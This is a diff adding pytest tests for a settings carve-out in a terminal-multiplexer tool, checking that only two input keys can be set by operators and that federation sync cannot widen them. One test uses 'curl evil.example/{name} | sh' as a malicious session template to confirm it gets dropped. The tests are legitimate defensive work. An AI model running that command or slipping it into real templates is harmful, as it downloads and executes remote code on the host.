@@ -465,6 +465,131 @@ def test_newly_fenced_keys_settable_via_local_settings_json(key, tmp_path, monke
 
 
 # ============================================================
+# OPERATOR_SETTABLE_LOCAL_KEYS -- operator-settable carve-out for
+# input_enabled/input_allowed_sessions (see settings.py's
+# OPERATOR_SETTABLE_LOCAL_KEYS comment and main.update_settings()).
+# ============================================================
+
+_OPERATOR_SETTABLE_KEYS = ("input_enabled", "input_allowed_sessions")
+
+
+def test_operator_settable_local_keys_is_subset_of_local_only_not_syncable():
+    """OPERATOR_SETTABLE_LOCAL_KEYS must be exactly the two input-typing
+    keys, each still in LOCAL_ONLY_KEYS (default-DENIED) and still absent
+    from SYNCABLE_KEYS (federation sync must never widen them, carve-out
+    or not)."""
+    from muxplex.settings import OPERATOR_SETTABLE_LOCAL_KEYS
+
+    assert OPERATOR_SETTABLE_LOCAL_KEYS == frozenset(_OPERATOR_SETTABLE_KEYS)
+    for key in OPERATOR_SETTABLE_LOCAL_KEYS:
+        assert key in LOCAL_ONLY_KEYS, (
+            f"{key!r} must remain in LOCAL_ONLY_KEYS (default-DENIED)"
+        )
+        assert key not in SYNCABLE_KEYS, f"{key!r} must never be in SYNCABLE_KEYS"
+
+
+@pytest.mark.parametrize("key", _OPERATOR_SETTABLE_KEYS)
+def test_patch_settings_default_still_drops_operator_settable_keys(key):
+    """Calling patch_settings() with NO allow_local_keys (the default,
+    unchanged call signature every pre-existing caller uses) must still
+    drop input_enabled/input_allowed_sessions exactly as before -- the
+    carve-out is opt-in per call, never automatic."""
+    custom = True if key == "input_enabled" else ["attacker-*"]
+    result = patch_settings({key: custom})
+    assert result[key] == DEFAULT_SETTINGS[key], (
+        f"patch_settings() with no allow_local_keys must still drop {key!r}, "
+        f"got: {result[key]!r}"
+    )
+    loaded = load_settings()
+    assert loaded[key] == DEFAULT_SETTINGS[key]
+
+
+def test_patch_settings_allow_local_keys_lets_input_enabled_through():
+    """Passing allow_local_keys={'input_enabled', ...} lets input_enabled
+    flow through the normal per-key copy instead of being dropped."""
+    from muxplex.settings import OPERATOR_SETTABLE_LOCAL_KEYS
+
+    result = patch_settings(
+        {"input_enabled": True}, allow_local_keys=OPERATOR_SETTABLE_LOCAL_KEYS
+    )
+    assert result["input_enabled"] is True
+    loaded = load_settings()
+    assert loaded["input_enabled"] is True
+
+
+def test_patch_settings_allow_local_keys_lets_input_allowed_sessions_through_normalized():
+    """Passing allow_local_keys lets input_allowed_sessions flow through too,
+    subject to the SAME normalize_input_allowed_sessions() normalization a
+    local settings.json edit already gets (via load_settings() on every
+    subsequent read)."""
+    from muxplex.settings import OPERATOR_SETTABLE_LOCAL_KEYS
+
+    result = patch_settings(
+        {"input_allowed_sessions": ["foo-*"]},
+        allow_local_keys=OPERATOR_SETTABLE_LOCAL_KEYS,
+    )
+    assert result["input_allowed_sessions"] == ["foo-*"]
+    loaded = load_settings()
+    assert loaded["input_allowed_sessions"] == ["foo-*"]
+
+
+def test_patch_settings_allow_local_keys_does_not_widen_unrelated_local_only_keys():
+    """allow_local_keys naming ONLY the two input-typing keys must not let
+    an unrelated LOCAL_ONLY_KEYS member (e.g. new_session_template) through
+    in the same patch -- the drop-skip is scoped exactly to the keys named,
+    nothing else."""
+    from muxplex.settings import OPERATOR_SETTABLE_LOCAL_KEYS
+
+    custom_template = "curl evil.example/{name} | sh"
+    result = patch_settings(
+        {"input_enabled": True, "new_session_template": custom_template},
+        allow_local_keys=OPERATOR_SETTABLE_LOCAL_KEYS,
+    )
+    assert result["input_enabled"] is True
+    assert result["new_session_template"] == DEFAULT_SETTINGS["new_session_template"]
+    assert result["new_session_template"] != custom_template
+
+
+def test_default_settings_input_keys_unchanged():
+    """Defaults must remain exactly what they were before this feature:
+    input_enabled=False, input_allowed_sessions=["*"]. Fresh (no on-disk
+    file) load_settings() must still report both."""
+    assert DEFAULT_SETTINGS["input_enabled"] is False
+    assert DEFAULT_SETTINGS["input_allowed_sessions"] == ["*"]
+
+    loaded = load_settings()
+    assert loaded["input_enabled"] is False
+    assert loaded["input_allowed_sessions"] == ["*"]
+
+
+def test_apply_synced_settings_ignores_operator_settable_keys():
+    """A federation-sync payload carrying input_enabled/input_allowed_sessions
+    must never write them -- apply_synced_settings() only ever copies keys
+    in SYNCABLE_KEYS, and neither key is a member (unaffected by the
+    operator-PATCH carve-out, which is PATCH-only and has no bearing on the
+    sync path at all)."""
+    incoming = {
+        "input_enabled": True,
+        "input_allowed_sessions": ["attacker-*"],
+        "sort_order": "alphabetical",
+    }
+    result = apply_synced_settings(incoming, incoming_timestamp=123.0)
+    assert result["input_enabled"] == DEFAULT_SETTINGS["input_enabled"]
+    assert (
+        result["input_allowed_sessions"] == DEFAULT_SETTINGS["input_allowed_sessions"]
+    )
+    # Sanity: an actually-syncable key in the same payload DOES apply, so
+    # this isn't just a broken/no-op call.
+    assert result["sort_order"] == "alphabetical"
+
+    loaded = load_settings()
+    assert loaded["input_enabled"] == DEFAULT_SETTINGS["input_enabled"]
+    assert (
+        loaded["input_allowed_sessions"] == DEFAULT_SETTINGS["input_allowed_sessions"]
+    )
+
+
+# ============================================================
 # Multi-device enabled flag (task: settings UI reorganization)
 # ============================================================
 
